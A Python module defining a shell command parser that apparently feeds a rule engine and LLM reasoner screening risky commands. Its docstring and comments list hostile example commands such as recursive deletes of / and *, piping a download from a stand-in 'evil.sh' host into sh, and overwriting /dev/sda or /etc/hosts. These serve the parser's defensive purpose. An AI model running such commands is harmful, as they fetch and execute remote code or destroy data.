"""
Command Parser — Owner: Harshit
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Converts a raw shell command string into a structured ParsedCommand
that the rule engine and LLM reasoner can work with.

Handles:
  - Basic commands: rm -rf /tmp/foo
  - Pipes:          cat file.txt | grep error | rm ...
  - Semicolons:     cd /; rm -rf *
  - Logical ops:    rm foo && echo done
  - Subshells:      $(curl http://evil.sh | sh)
  - Heredocs:       cat << EOF > /etc/hosts
  - Sudo:           sudo rm -rf /important
  - Redirections:   echo "" > /dev/sda
  - Aliases:        resolved before analysis
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class ParsedCommand:
    """
    Structured representation of a shell command after parsing.
    This is the object consumed by both the Rule Engine and LLM Reasoner.
    """
    raw: str                               # Original unmodified command string
    tokens: list[str]                      # shlex-tokenized tokens
    base_command: str                      # The primary executable (e.g. "rm")
    flags: list[str]                       # Flags/options (e.g. ["-r", "-f"])
    arguments: list[str]                   # Positional arguments (paths, etc.)
    is_sudo: bool                          # True if command uses sudo/su
    has_pipe: bool                         # True if command contains pipes
    has_redirect: bool                     # True if command has > >> redirections
    has_subshell: bool                     # True if command contains $() or ``
    pipe_segments: list["ParsedCommand"]   # Each segment of a piped command
    target_paths: list[str]                # Resolved target filesystem paths
    cwd: str                               # Working directory context
    user: str                              # Executing user
    is_glob: bool = False                  # True if arguments contain wildcards
    glob_patterns: list[str] = field(default_factory=list)


class CommandParser:
    """
    Parses a raw shell command string into a ParsedCommand.

    Usage:
        parser = CommandParser()
        parsed = parser.parse("sudo rm -rf /var/log/*", cwd="/home/user", user="harshit")
    """

    # Patterns for structural detection
    _PIPE_SPLIT     = re.compile(r"\s*\|\s*")
    _REDIRECT_RE    = re.compile(r"(?:>>?|<<?)(?:\s*\S+)?")
    _SUBSHELL_RE    = re.compile(r"\$\(.*?\)|\`.*?\`", re.DOTALL)
    _GLOB_RE        = re.compile(r"[*?\[\]]")
    _SUDO_CMDS      = {"sudo", "su", "doas", "pkexec"}

    def parse(self, command: str, cwd: str = "", user: str = "") -> ParsedCommand:
        """
        Parse a raw command string into a ParsedCommand.

        For piped commands, each segment is parsed independently and stored
        in pipe_segments. The top-level ParsedCommand represents the first segment.
        """
        raw = command.strip()

        # Handle piped commands
        segments_raw = self._split_pipes(raw)
        if len(segments_raw) > 1:
            pipe_segments = [self._parse_single(s, cwd, user) for s in segments_raw]
            root = pipe_segments[0]
            root.has_pipe = True
            root.pipe_segments = pipe_segments
            return root

        return self._parse_single(raw, cwd, user)

    def _parse_single(self, command: str, cwd: str, user: str) -> ParsedCommand:
        """Parse a single (non-piped) command segment."""
        raw = command.strip()
        tokens = self._safe_tokenize(raw)

        if not tokens:
            return ParsedCommand(
                raw=raw, tokens=[], base_command="", flags=[], arguments=[],
                is_sudo=False, has_pipe=False, has_redirect=False,
                has_subshell=False, pipe_segments=[], target_paths=[],
                cwd=cwd, user=user,
            )

        # Detect sudo and peel it
        is_sudo = tokens[0] in self._SUDO_CMDS
        effective_tokens = tokens
        if is_sudo and len(tokens) > 1:
            # Skip sudo + any sudo flags (e.g. sudo -u root rm ...)
            skip = 1
            while skip < len(tokens) and tokens[skip].startswith("-"):
                skip += 1
            effective_tokens = tokens[skip:]

        base_command = effective_tokens[0] if effective_tokens else ""
        rest = effective_tokens[1:]
        flags = [t for t in rest if t.startswith("-")]
        arguments = [t for t in rest if not t.startswith("-")]
        glob_patterns = [a for a in arguments if self._GLOB_RE.search(a)]

        return ParsedCommand(
            raw=raw,
            tokens=tokens,
            base_command=base_command,
            flags=flags,
            arguments=arguments,
            is_sudo=is_sudo,
            has_pipe=False,
            has_redirect=bool(self._REDIRECT_RE.search(raw)),
            has_subshell=bool(self._SUBSHELL_RE.search(raw)),
            pipe_segments=[],
            target_paths=arguments,  # Alias; resolver can refine these later
            cwd=cwd,
            user=user,
            is_glob=bool(glob_patterns),
            glob_patterns=glob_patterns,
        )

    def _safe_tokenize(self, command: str) -> list[str]:
        """shlex tokenization with graceful fallback for syntax errors."""
        try:
            return shlex.split(command)
        except ValueError:
            # Fallback: naive whitespace split (handles unclosed quotes in edge cases)
            return command.split()

    def _split_pipes(self, command: str) -> list[str]:
        """
        Split a piped command into segments, respecting quotes and subshells.
        Example: 'curl http://x.sh | sh' → ['curl http://x.sh', 'sh']
        """
        segments: list[str] = []
        current: list[str] = []
        depth = 0
        in_single_quote = False
        in_double_quote = False

        i = 0
        while i < len(command):
            ch = command[i]
            if ch == "'" and not in_double_quote:
                in_single_quote = not in_single_quote
            elif ch == '"' and not in_single_quote:
                in_double_quote = not in_double_quote
            elif ch in ("(", "{") and not in_single_quote and not in_double_quote:
                depth += 1
            elif ch in (")", "}") and not in_single_quote and not in_double_quote:
                depth -= 1
            elif ch == "|" and depth == 0 and not in_single_quote and not in_double_quote:
                # Avoid splitting on || (logical OR)
                if i + 1 < len(command) and command[i + 1] == "|":
                    current.append("||")
                    i += 2
                    continue
                segments.append("".join(current).strip())
                current = []
                i += 1
                continue
            current.append(ch)
            i += 1

        if current:
            segments.append("".join(current).strip())

        return [s for s in segments if s]
